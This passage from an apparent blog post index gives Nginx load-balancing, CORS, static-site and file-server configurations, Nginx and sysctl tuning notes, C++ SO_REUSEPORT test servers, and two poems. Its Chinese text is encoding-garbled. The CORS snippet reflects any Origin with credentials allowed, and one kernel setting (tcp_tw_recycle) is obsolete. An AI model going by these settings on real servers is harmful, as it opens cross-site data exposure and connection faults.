#é”™è¯¯å¤„ç†é¡µé¢ï¼ˆå¯é€‰æ‹©æ€§é…ç½®ï¼‰ error_page 404 /404.html; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; è´Ÿè½½å‡è¡¡ nginx.conf æ–‡ä»¶å¦‚ä¸‹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091http &#123; #è®¾å®šmimeç±»å‹,ç±»å‹ç”±mime.typeæ–‡ä»¶å®šä¹‰ include /etc/nginx/mime.types; default_type application/octet-stream; #è®¾å®šæ—¥å¿—æ ¼å¼ access_log /var/log/nginx/access.log; #è®¾å®šè´Ÿè½½å‡è¡¡çš„æœåŠ¡å™¨åˆ—è¡¨ ä»¥ä¸‹å¤šé€‰ä¸€è¿›è¡Œé…ç½® # -- åŠ æƒè½®è¯¢æ–¹å¼ upstream load_balance_server &#123; #weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ server 192.168.1.11:80 weight=5; server 192.168.1.12:80 weight=1; server 192.168.1.13:80 weight=6; &#125; # -- è½®è¯¢ upstream load_balance_server &#123; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- æœ€å°‘è¿æ¥æ•° upstream load_balance_server &#123; least_conn; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- åŠ æƒæœ€å°‘è¿æ¥æ•° upstream load_balance_server &#123; least_conn; server 192.168.1.11:80 weight=5; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- IP hash upstream load_balance_server &#123; ip_hash; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- uri æ™®é€šhash upstream load_balance_server &#123; hash $request_uri; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; #HTTPæœåŠ¡å™¨ server &#123; listen 80; server_name www.helloworld.com; #å¯¹æ‰€æœ‰è¯·æ±‚è¿›è¡Œè´Ÿè½½å‡è¡¡è¯·æ±‚ location / &#123; root /root; #å®šä¹‰æœåŠ¡å™¨çš„é»˜è®¤ç½‘ç«™æ ¹ç›®å½•ä½ç½® index index.html index.htm; #å®šä¹‰é¦–é¡µç´¢å¼•æ–‡ä»¶çš„åç§° proxy_pass http://load_balance_server ;#è¯·æ±‚è½¬å‘load_balance_server å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨ #ä»¥ä¸‹æ˜¯ä¸€äº›åå‘ä»£ç†çš„é…ç½®(å¯é€‰æ‹©æ€§é…ç½®) #proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; #åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IP proxy_set_header X-Forwarded-For $remote_addr; proxy_connect_timeout 90; #nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶) proxy_send_timeout 90; #åç«¯æœåŠ¡å™¨æ•°æ®å›ä¼ æ—¶é—´(ä»£ç†å‘é€è¶…æ—¶) proxy_read_timeout 90; #åç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶) proxy_buffer_size 4k; #è®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼ˆnginxï¼‰ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å° proxy_buffers 4 32k; #proxy_buffersç¼“å†²åŒºï¼Œå‡è®¾ç½‘é¡µå¹³å‡åœ¨32kä»¥ä¸‹çš„è¯ proxy_busy_buffers_size 64k; #é«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°ï¼ˆproxy_buffers*2ï¼‰ proxy_temp_file_write_size 64k; #è®¾å®šç¼“å­˜æ–‡ä»¶å¤¹å¤§å°ï¼Œå¤§äºè¿™ä¸ªå€¼ï¼Œå°†ä»upstreamæœåŠ¡å™¨ä¼ è¾“ client_max_body_size 10m; #å…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•° client_body_buffer_size 128k; #ç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•° &#125; &#125;&#125; å¤šç«¯å£åº”ç”¨é…ç½® nginx.conf æ–‡ä»¶å¦‚ä¸‹ï¼Œé€šè¿‡ URL å°†è¯·æ±‚è·¯ç”±åˆ°æ­£ç¡®çš„æœåŠ¡æ‰€åœ¨ç«¯å£ä¸Šã€‚ 12345678910111213141516171819202122232425262728293031323334353637http &#123; #ä¸€äº›åŸºæœ¬é…ç½® #... upstream product_server &#123; server www.helloworld.com:8081; &#125; upstream admin_server &#123; server www.helloworld.com:8082; &#125; upstream finance_server &#123; server www.helloworld.com:8083; &#125; server &#123; #... #é»˜è®¤æŒ‡å‘productçš„server location / &#123; proxy_pass http://product_server; &#125; location /product/ &#123; proxy_pass http://product_server; &#125; location /admin/ &#123; proxy_pass http://admin_server; &#125; location /finance/ &#123; proxy_pass http://finance_server; &#125; &#125;&#125; é™æ€ç«™ç‚¹ 1234567891011121314151617181920212223242526worker_processes 4;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; gzip on; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png; gzip_vary on; server &#123; listen 80; server_name www.static.com; location / &#123; root /app/dist; # é™æ€èµ„æºæ‰€åœ¨ç›®å½• index index.html; # è¯·æ±‚è¿”å› index.html &#125; &#125;&#125; ç®€æ˜“æ–‡ä»¶æœåŠ¡å™¨ 1234567891011autoindex on; # æ˜¾ç¤ºç›®å½•autoindex_exact_size on; # æ˜¾ç¤ºæ–‡ä»¶å¤§å°autoindex_localtime on; # æ˜¾ç¤ºæ–‡ä»¶æ—¶é—´server &#123; charset utf-8,gbk; # ç¼–ç æ”¯æŒ listen 9050 default_server; listen [::]:9050 default_server; server_name _; root /share/fs; # å…±äº«æ–‡ä»¶æœåŠ¡çš„æ ¹è·¯å¾„&#125; å‰åç«¯è·¨åŸŸæ–¹æ¡ˆ é¦–å…ˆæ–°å»ºé…ç½®æ–‡ä»¶ solution.confï¼š 1234567891011121314151617181920212223242526# allow origin listset $ACAO '*';# set single originif ($http_origin ~* (www.helloworld.com)$) &#123; set $ACAO $http_origin;&#125;if ($cors = \"trueget\") &#123; add_header 'Access-Control-Allow-Origin' \"$http_origin\"; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type';&#125;if ($request_method = 'OPTIONS') &#123; set $cors \"$&#123;cors&#125;options\";&#125;if ($request_method = 'GET') &#123; set $cors \"$&#123;cors&#125;get\";&#125;if ($request_method = 'POST') &#123; set $cors \"$&#123;cors&#125;post\";&#125; å†é…ç½®æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼š 123456789101112131415161718192021222324# ...upstream front_server &#123; server www.helloworld.com:9000;&#125;upstream api_server &#123; server www.helloworld.com:8080;&#125;server &#123; listen 80; server_name www.helloworld.com; location ~ ^/api/ &#123; include solution.conf.conf; # include æ–°å»ºçš„é…ç½®æ–‡ä»¶ proxy_pass http://api_server; rewrite \"^/api/(.*)$\" /$1 break; &#125; location ~ ^/ &#123; proxy_pass http://front_server; &#125;&#125; NGINXè®¾è®¡ä¸ä¼˜åŒ–å°ç»“ å…³é—­ Nagle ç®—æ³•ï¼šå…³é—­ä¸ºå°æ•°æ®åŒ…è®¾è®¡çš„ Nagle ç®—æ³•ï¼Œä¸€èˆ¬ HTTP åè®®åŒ…æ™®éæ¯”è¾ƒå¤§ å¼€å¯ cork ç®—æ³•ï¼šå°½é‡è®©æ•°æ®åŒ…è¾¾åˆ°ä¸€ä¸ª MTU å¤§å°å†å‘é€ï¼Œæé«˜ç½‘ç»œæœ‰æ•ˆè´Ÿè½½ï¼Œå‘é€å¤§é‡æ•°æ®æ—¶æœ‰æ•ˆã€‚ å‘é€æ–‡ä»¶ sendfile : ç›´æ¥å°†å†…æ ¸æ€è¯»å–çš„æ•°æ®åŒ…å‘é€åˆ°å†…æ ¸åè®®æ ˆæ•°æ®é€šè·¯ã€‚ å¼€å¯ TCP_DEFER_ACCEPT é€‰é¡¹ï¼šè®©å¥—æ¥å­—åœ¨æœ‰æ•°æ®å¯è¯»æ—¶ï¼Œæ‰ç”Ÿæˆå»ºç«‹è¿æ¥çš„å¥—æ¥å­—ï¼Œæé«˜æ•ˆç‡ã€‚ ä½¿ç”¨ accept4 : å»ºç«‹éé˜»å¡è¿æ¥ï¼Œå‡å°‘ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ã€‚ ä½¿ç”¨ TCP_QUICKACK: å°† ACK ä¸ æ•°æ®åŒ… ä¸€èµ·å‘é€ï¼Œæ¯æ¬¡ recv åéœ€è¦é‡æ–°è®¾ç½®ã€‚ ä½¿ç”¨ç”¨æˆ·æ€é”ï¼šnginxæ²¡æœ‰ä½¿ç”¨ç³»ç»Ÿçš„ä¿¡å·é‡é”ï¼Œè€Œæ˜¯ä½¿ç”¨äº†â€œå…±äº«å†…å­˜+åŸå­æ“ä½œ__sync_bool_compare_and_swapâ€å®ç°çš„ç”¨æˆ·æ€é”ã€‚è¿™æ ·æ¯æ¬¡åŠ é”è§£é”æ“ä½œéƒ½ä¸éœ€è¦è¿›å…¥å†…æ ¸æ€ï¼Œæå¤§çš„æé«˜äº†é”çš„æ€§èƒ½ã€‚ é¿å…æƒŠç¾¤ï¼šå¦‚æœå¤šä¸ª worker åŒæ—¶ç›‘å¬ä¸€ä¸ªå¥—æ¥å­—ï¼Œnginx ä½¿ç”¨é”ä¿è¯åªæœ‰ä¸€ä¸ª woker åœ¨ç›‘å¬å’Œacceptã€‚åŠ å…¥ä¸€ä¸ªé˜Ÿåˆ—åï¼Œå…ˆé‡Šæ”¾é”ï¼Œå†å¤„ç†è¿æ¥è¯·æ±‚ã€‚ å‡å°‘ keepalive æ—¶é—´ï¼šæ“ä½œç³»ç»Ÿçš„ keepalive åŸç†æ˜¯å‘é€ä¸€ä¸ªé•¿åº¦ä¸º 0 çš„tcpæ•°æ®åŒ…ï¼Œç­‰å¾…å¯¹ç«¯çš„ ACK ç›¸åº”ã€‚å¦‚æœæœ‰å“åº”åˆ™è®¤ä¸ºè¿æ¥æ—¶ alive çš„ã€‚ç³»ç»Ÿé»˜è®¤æ—¶é—´å¤ªé•¿ã€‚ä½†æ˜¯ä¸€èˆ¬å¦‚æœæ—¶é•¿è¿æ¥è®¾è®¡ï¼Œä¼šåœ¨åº”ç”¨å±‚è®¾è®¡å¿ƒè·³ã€‚ è‡ªå»ºå†…å­˜æ± ï¼šæ¯”å¦‚ä¸€ä¸ª HTTP è¿æ¥å¯¹åº”ä¸€ä¸ªå†…å­˜æ± ï¼Œè¿æ¥ç»“æŸæ•´ä¸ªé‡Šæ”¾å†…å­˜æ± ã€‚ master æ—¶é—´ç®¡ç†ï¼šmaster æ¯ 100ms å°†å¤šç§æ—¶é—´æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥å…±äº«å†…å­˜ï¼Œworker ä¸éœ€è¦å•ç‹¬æ ¼å¼åŒ–ï¼Œç›´æ¥è¯»å–å…±äº«å†…å­˜ã€‚ æé«˜CPUç¼“å­˜åˆ©ç”¨ç‡ï¼šsetpriority æé«˜è¿›ç¨‹ä¼˜å…ˆçº§ã€‚sched_setaffinity ç»‘å®šCPUæé«˜CPUç¼“å­˜çš„å‘½ä¸­ç‡ã€‚ å†…å­˜ç®¡ç†ä¼˜åŒ–ï¼šä½¿ç”¨ tcmalloc æ›¿ä»£ glibc ä¸­çš„ malloc/free å†…æ ¸å‚æ•°ä¼˜åŒ–ï¼š &gt; fs.file-max = 999999 # è¿›ç¨‹å¯ä»¥åŒæ—¶æ‰“å¼€çš„æœ€å¤§å¥æŸ„æ•°é‡ &gt; &gt; net.ipv4.tcp_max_tw_buckets = 6000 # ç³»ç»Ÿå…è®¸TIME_WAITå¥—æ¥å­—æ•°é‡çš„æœ€å¤§å€¼ä¸åº”å¤ªå¤§ &gt; net.ipv4.ip_local_port_range = 1024 65000 # å…è®¸ç³»ç»Ÿæ‰“å¼€çš„ç«¯å£èŒƒå›´ &gt; net.ipv4.tcp_tw_recycle = 1 # time waitå¿«é€Ÿå›æ”¶ &gt; net.ipv4.tcp_tw_reuse = 1 # å…è®¸å°†TIME WAIT socketsé‡æ–°ç”¨äºæ–°çš„TCPè¿æ¥ &gt; net.ipv4.tcp_keepalive_time = 30 # TCPå‘é€keepaliveæ¶ˆæ¯çš„é¢‘ç‡ &gt; net.ipv4.tcp_syncookies = 1 # å¼€å¯SYN Cookiesï¼Œå½“SYNç­‰å¾…é˜Ÿåˆ—æº¢å‡ºæ—¶ï¼Œcookiesæ¥å¤„ç† &gt; net.ipv4.tcp_max_syn_backlog = 262144 # TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹é˜¶æ®µæ¥å—SYNè¯·æ±‚é˜Ÿåˆ—çš„æœ€å¤§é•¿åº¦ &gt; net.core.netdev_max_backlog = 262144 # å…è®¸é€åˆ°æ•°æ®ç¼“å­˜é˜Ÿåˆ—çš„æ•°æ®åŒ…çš„æœ€å¤§æ•°ç›® &gt; &gt; net.ipv4.tcp_rmem = 10240 87380 12582912 # TCPæ¥å—ç¼“å­˜çª—å£çš„æœ€å°å€¼ã€é»˜è®¤å€¼ã€æœ€å¤§å€¼ &gt; net.ipv4.tcp_wmem = 10240 87380 12582912 # TCPå‘é€ç¼“å­˜çª—å£çš„æœ€å°å€¼ã€é»˜è®¤å€¼ã€æœ€å¤§å€¼ &gt; &gt; net.core.rmem_default = 6291456 # å†…æ ¸å¥—æ¥å­—æ¥å—ç¼“å­˜åŒºé»˜è®¤çš„å¤§å° &gt; net.core.wmem_default = 6291456 # å†…æ ¸å¥—æ¥å­—å‘é€ç¼“å­˜åŒºé»˜è®¤çš„å¤§å° &gt; &gt; net.core.rmem_max = 12582912 # å†…æ ¸å¥—æ¥å­—æ¥å—ç¼“å­˜åŒºçš„æœ€å¤§å¤§å° &gt; net.core.wmem_max = 12582912 # å†…æ ¸å¥—æ¥å­—å‘é€ç¼“å­˜åŒºçš„æœ€å¤§å¤§å° &gt; &gt; net.core.somaxconn = 40960 # ç³»ç»Ÿä¸­æ¯ä¸€ä¸ªç«¯å£æœ€å¤§çš„ç›‘å¬é˜Ÿåˆ—çš„é•¿åº¦ï¼Œå¯¹é˜²æ­¢æ‹’ç»æœåŠ¡ DoS æ”»å‡»ä¹Ÿä¼šæœ‰æ‰€å¸®åŠ© &gt; &gt; ### sysctl -p åº”ç”¨é…ç½® äº‹ä»¶å¤„ç†æ¨¡å‹ï¼šmulti_accept on æ—¶ï¼Œå¤šä¸ª worker ä¼šæŒ‰ä¸²è¡Œæ–¹å¼æ¥å¤„ç†è¿æ¥ï¼›off æ—¶ï¼Œworker ä½¿ç”¨å¹¶è¡Œæ¨¡å¼ï¼Œä¸€ä¸ªè¿æ¥å”¤é†’æ‰€æœ‰ workerï¼Œè¿™ç§æ¨¡å¼ä½¿ç”¨ä¸è¿æ¥æ•°è¾ƒå°‘çš„ä½è´Ÿè½½åœºæ™¯ã€‚ æ”¯æŒçƒ­åŠ è½½ï¼šnginx -s reload æ—¶ï¼Œmaster è¿›ç¨‹æ ¡éªŒé…ç½®å¹¶æ‰“å¼€æ–°çš„ç›‘å¬ç«¯å£ï¼Œç„¶åå¯åŠ¨æ–°çš„ worker å­è¿›ç¨‹ï¼Œæ¥ç€å‘æ—§çš„ worker å‘é€åœæ­¢ä¿¡å·ã€‚æ—§ worker å¤„ç†å®Œè¯·æ±‚ï¼Œæˆ–è€…åœ¨ worker_shert_dump æ—¶é—´ä¹‹åä¼šå…³é—­è¿›ç¨‹ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Nginx","slug":"Notes/Nginx","permalink":"https://racleray.github.io/categories/Notes/Nginx/"}],"tags":[{"name":"NGINX","slug":"NGINX","permalink":"https://racleray.github.io/tags/NGINX/"},{"name":"Server Design","slug":"Server-Design","permalink":"https://racleray.github.io/tags/Server-Design/"}],"author":"HeRui"},{"title":"REUSEPORT","slug":"REUSEPORT","date":"2024-03-03T16:06:07.000Z","updated":"2024-03-03T16:16:19.515Z","comments":true,"path":"posts/e474b5c3.html","link":"","permalink":"https://racleray.github.io/posts/e474b5c3.html","excerpt":"socket REUSEPORT åˆ†æ","text":"REUSEPORT åœºæ™¯ TCP REUSEPORT é€‰é¡¹é€šè¿‡æ¯ä¸ªç›‘å¬çº¿ç¨‹ä½¿ç”¨ä¸åŒçš„ listen fd æ¥æ”¹è¿›accpetçš„è´Ÿè½½åˆ†é…ã€‚ç›¸æ¯”äºåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­è¿›è¡Œ accept æˆ–è€…å¤šä¸ªçº¿ç¨‹åœ¨åŒä¸€ä¸ª listen fd ä¸Šè¿›è¡Œ acceptï¼Œæœ‰åŠ©äºç³»ç»Ÿçš„è´Ÿè½½å‡è¡¡ã€‚ REUSEPORT è§£å†³çš„é—®é¢˜æ˜¯ï¼šä¸¤ä¸ªçº¿ç¨‹åŒæ—¶ bind åœ¨ç›¸åŒçš„ IP:Port ä¸Šï¼Œå½“ä¸¤è€…åŒæ—¶è¿›å…¥ TCP_LISTEN çŠ¶æ€ï¼Œå†…æ ¸å¦‚ä½•å°†ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥åˆ†å‘ç»™æ­£ç¡®çš„çº¿ç¨‹ã€‚ bind å†…æ ¸ bind è¿‡ç¨‹ï¼š æ ¹æ® IP å’Œ Port ç­‰è®¡ç®— hash key ï¼› åœ¨ bind_hash_bucket ä¸­æ‰¾åˆ°å¯¹åº”çš„ bind_bucket é“¾è¡¨ï¼Œé“¾è¡¨ç”± sock ç»“æ„ä½“ç»„æˆï¼› bind å°†æ–°çš„ sock ç»“æ„ä½“æ·»åŠ åˆ°å¯¹åº”é“¾è¡¨ï¼› æ·»åŠ æ—¶ï¼Œç”± inet_csk_get_port æ£€æŸ¥å½“å‰ä½¿ç”¨çš„ port çš„åˆæ³•æ€§ï¼› æ£€æŸ¥ fastreuse æ ‡å¿—ä½æ˜¯å¦ä¸ºçœŸï¼Œæˆ–è€… fastreuseport æ ‡å¿—ä½æ˜¯å¦ä¸ºçœŸï¼Œä¸”æ–°è¿æ¥çš„ UID æ˜¯å¦å’Œå½“å‰è¿›ç¨‹ç›¸åŒã€‚æ ‡å¿—ä½å¿«é€Ÿåˆ¤æ–­æˆåŠŸæ—¶ï¼Œç›´æ¥è¿”å›å¯ç”¨ï¼› è‹¥å¿«é€Ÿåˆ¤æ–­ä¸æˆåŠŸï¼Œå°†éå† sock é“¾è¡¨ï¼Œåˆ¤æ–­æ˜¯å¦ç”±å†²çªï¼› REUSEPORT é€‰é¡¹å¼€å¯åï¼Œä¸¤ä¸ªçº¿ç¨‹çš„è¿æ¥å†²çªçš„æ¡ä»¶ä¸ºï¼Œsock å½“å‰ä¸æ˜¯ TCP_TIME_WAIT çŠ¶æ€ä¸”è¿æ¥ UID ä¸åŒä¸çº¿ç¨‹ UIDã€‚å…¶ä»–æƒ…å†µä¸‹ï¼Œä¸ä¼šå­˜åœ¨è¿æ¥å†²çªçš„æƒ…å†µã€‚ æµ‹è¯• æµ‹è¯•ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// server 1#include &lt;arpa/inet.h&gt;#include &lt;errno.h&gt;#include &lt;iostream&gt;#include &lt;net/ethernet.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;string&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;using namespace std;int main(int argc, char *argv[]) &#123; int listenfd = socket(AF_INET, SOCK_STREAM, 0); if (listenfd &lt; 0) &#123; std::cout &lt;&lt; \"socket error\" &lt;&lt; std::endl; return -1; &#125; int port = 30001; std::string addr_str = \"127.0.0.1\"; std::cout &lt;&lt; \"[tcp server_test1] addr:\" &lt;&lt; addr_str &lt;&lt; \":\" &lt;&lt; port &lt;&lt; \" fd=\" &lt;&lt; listenfd &lt;&lt; std::endl; sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = inet_addr(addr_str.c_str()); // addr.sin_addr.s_addr = htonl(INADDR_ANY);#ifdef RU_PORT int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEPORT error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEPORT succ\" &lt;&lt; std::endl;#endif#ifdef RU_ADDR int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEADDR error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEADDR succ\" &lt;&lt; std::endl;#endif //=========================================================================== // bind int ret = bind(listenfd, (sockaddr *)&amp;addr, sizeof(addr)); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"bind error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"bind success\" &lt;&lt; std::endl; //=========================================================================== // listen#ifndef NO_LISTEN ret = listen(listenfd, 5); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"listen error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"listen success\" &lt;&lt; std::endl;#endif //=========================================================================== // accept while (1) &#123;#ifndef NO_LISTEN sockaddr cli_addr; socklen_t len; // accept std::cout &lt;&lt; \"accepting \" &lt;&lt; std::endl; int connfd = accept(listenfd, &amp;cli_addr, &amp;len); if (connfd &lt; 0) &#123; std::cout &lt;&lt; \"accept error, error=\" &lt;&lt; strerror(errno) &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"accept success, connfd=\" &lt;&lt; connfd &lt;&lt; std::endl; // shutdown std::cout &lt;&lt; \"INFO: input 1 to close connection, go to timewait\" &lt;&lt; std::endl; int close_flag; std::cin &gt;&gt; close_flag; if (close_flag == 1) &#123; shutdown(connfd, SHUT_WR); &#125; std::cout &lt;&lt; \"success call shutdown, now exit\" &lt;&lt; std::endl; break;#endif &#125; close(listenfd); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// server 2#include &lt;arpa/inet.h&gt;#include &lt;errno.h&gt;#include &lt;iostream&gt;#include &lt;net/ethernet.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;string&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]) &#123; int listenfd = socket(AF_INET, SOCK_STREAM, 0); if (listenfd &lt; 0) &#123; std::cout &lt;&lt; \"socket error\" &lt;&lt; std::endl; return -1; &#125; int port = 30001; std::string addr_str = \"127.0.0.1\"; std::cout &lt;&lt; \"[tcp server_test2] addr:\" &lt;&lt; addr_str &lt;&lt; \":\" &lt;&lt; port &lt;&lt; \" fd=\" &lt;&lt; listenfd &lt;&lt; std::endl; sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_addr.s_addr = inet_addr(addr_str.c_str()); addr.sin_port = htons(port);#ifdef RU_PORT int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEPORT error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEPORT success\" &lt;&lt; std::endl;#endif#ifdef RU_ADDR int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEADDR error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEADDR success\" &lt;&lt; std::endl;#endif int ret = bind(listenfd, (sockaddr *)&amp;addr, sizeof(addr)); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"bind error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"bind success\" &lt;&lt; std::endl;#ifndef NO_LISTEN ret = listen(listenfd, 5); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"listen error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"listen success\" &lt;&lt; std::endl;#endif while (1) &#123;&#125; close(listenfd); return 0;&#125; Case 1: ä¸å¼€å¯ REUSEADDR å’Œ REUSEPORTï¼Œä½¿ç”¨ç›¸åŒ IP å’Œ PORT Case 2: å¼€å¯ REUSEADDR ï¼Œä½†æ˜¯ä¸è°ƒç”¨ listenï¼Œä½¿ç”¨ç›¸åŒ IP å’Œ PORT Case 3: å¼€å¯ REUSEADDR ï¼Œè°ƒç”¨ listenï¼Œä½¿ç”¨ç›¸åŒ IP å’Œ PORT Case 4: å¼€å¯ REUSEPORT ï¼Œè°ƒç”¨ listenï¼Œä½¿ç”¨ç›¸åŒ IP å’Œ PORT","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Computer Network","slug":"Notes/Computer-Network","permalink":"https://racleray.github.io/categories/Notes/Computer-Network/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Network","slug":"Network","permalink":"https://racleray.github.io/tags/Network/"},{"name":"Socket","slug":"Socket","permalink":"https://racleray.github.io/tags/Socket/"}],"author":"HeRui"},{"title":"Dangle","slug":"Dangle","date":"2024-02-12T14:45:50.000Z","updated":"2024-02-12T15:00:59.813Z","comments":true,"path":"posts/e3a85bcd.html","link":"","permalink":"https://racleray.github.io/posts/e3a85bcd.html","excerpt":"å‡¡äºº","text":"Incomprehension A Journey to the West ä¸€æœ›æ— é™…çš„æ¢¦é‡Œï¼Œç”¨ç¢—é‡Œçš„ç±³å’å¢™ ä¹Œäº‘å†™æ»¡å’’è¯­ï¼Œé®ä½ä¼—ç”Ÿç–²æƒ«çš„éª¨å¤´ ç‹ç‹¸åœ¨å±±å¡å¿µå¿µæœ‰è¯ ç¶å°ä¸Šçš„å¹´å…½åå¤å†¬çœ  æ™¨æ˜çº¿å‰²å¼€å¤§åœ°çš„æŒ‡çº¹ æ°´è‰ç¼ ä½é£ï¼Œå†»ç»“æ¢¦å¢ƒçš„é€’å½’ èƒ¸å£çš„é¸Ÿç¾¤ï¼Œç»•è¿‡åä¸‡ä¸ªå¤ªé˜³ å¸¦èµ°è¢«æµ‡ç­çš„é—ªç”µ å¸¦èµ°äº‘å±‚æ½®æ± å¸¦èµ°ç¥æ˜çš„æ‚„æ‚„è¯ å¸¦èµ°è½åœ°ç”Ÿæ ¹çš„çŒ« å¸¦èµ°æ°§åŒ–çš„æƒ…æ­Œ å¸¦èµ°å±±é‡æ©ä»‡ å¸¦èµ°é‡‘é“¶è´¢å® å¸¦èµ°ç—´å¿ƒå¦„æƒ³ å¸¦èµ°æ¢¦æ¸¸çš„è„šå° å¸¦èµ°é£è›¾æ‰‘ä¸ç­çš„ç« å¸¦èµ°æ‰€æœ‰äººçš„åå­— å¸¦èµ°å½©è™¹çš„åŒ–çŸ³","categories":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/categories/Poetry/"},{"name":"Meditation","slug":"Poetry/Meditation","permalink":"https://racleray.github.io/categories/Poetry/Meditation/"}],"tags":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/tags/Poetry/"}],"author":"HeRui"},{"title":"Poetry","slug":"Poetry","date":"2024-01-24T04:20:56.000Z","updated":"2024-02-06T13:33:01.096Z","comments":true,"path":"posts/cdfe5c99.html","link":"","permalink":"https://racleray.github.io/posts/cdfe5c99.html","excerpt":"Seven Times Have I Despised My Soul","text":"Seven Times Have I Despised My Soul Khalil Gibran â€‹ Seven times have I despired my soul. â€‹ â€‹ The first time when I saw her being meek that she might attain height. â€‹ The second time when I saw her limping before the crippled. â€‹ The third time when she was given to choose between the hard and the easy, â€‹ and she chose the easy. â€‹ The fourth time when she committed a wrong, and comforted herself that others also commit wrong. â€‹ The fifth time when she forbore for weakness, and attributed her patience to strength. â€‹ The sixth time when she despired the ugliness of a face, and knew not that it was one of her own masks. â€‹ And the seventh time when she sang a song of praise, and deemed it a 